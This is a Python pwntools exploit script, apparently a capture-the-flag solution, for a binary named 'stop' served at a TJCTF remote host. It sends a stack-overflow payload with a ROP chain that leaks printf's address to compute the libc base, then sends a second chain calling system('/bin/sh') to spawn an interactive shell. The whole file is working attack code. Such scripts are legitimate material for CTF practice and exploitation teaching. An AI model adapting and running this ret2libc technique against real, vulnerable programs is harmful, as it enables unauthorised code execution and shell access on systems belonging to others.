#!/usr/bin/python3

from pwn import *

#p = process('./stop')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('p1.tjctf.org', 8001)
libc = ELF('libc-database/db/libc6_2.27-3ubuntu1_amd64.so')

binary = ELF('./stop')

context.clear(arch='amd64')
rop = ROP('stop')
try:
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

p.recvuntil('Which letter? ')
p.sendline('A')
p.recvuntil('Category? ')

payload  = b''
payload += 0x118 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binary.got['printf'])
payload += p64(binary.plt['printf'])
payload += p64(pop_rdi + 1)
payload += p64(binary.symbols['main'])

p.sendline(payload)
p.recvline()
p.recvline()
_ = p.recv(6)

printf = u64(_ + 2*b'\x00')
print('printf:',hex(printf))
baselibc = printf - libc.symbols['printf']
print('baselibc:',hex(baselibc))

p.recvuntil('Which letter? ')
p.sendline('A')
p.recvuntil('Category? ')

payload  = b''
payload += 0x118 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(baselibc + next(libc.search(b"/bin/sh")))
payload += p64(baselibc + libc.symbols['system'])

p.sendline(payload)
p.interactive()
